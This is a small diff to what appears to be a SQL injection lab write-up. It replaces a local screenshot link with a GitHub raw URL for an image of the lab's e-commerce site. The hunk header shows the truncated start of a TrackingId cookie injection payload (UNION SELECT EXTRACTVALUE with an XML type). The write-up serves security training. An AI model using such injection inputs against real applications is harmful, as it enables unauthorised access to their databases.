@@ -82,7 +82,7 @@ TrackingId=' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UT
 
 The application initially appeared to be a normal e-commerce website containing the **Gifts** category filter.
 
-![Main Website](screenshots/oast-sqli-1.png)
+![Main Website](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/sqli/Blind%20SQL%20Injection%20with%20Out-of-Band%20Interaction/screenshots/lab12.png?raw=true)
 
 **Caption:** Initial application interface containing the Gifts category filter.
 
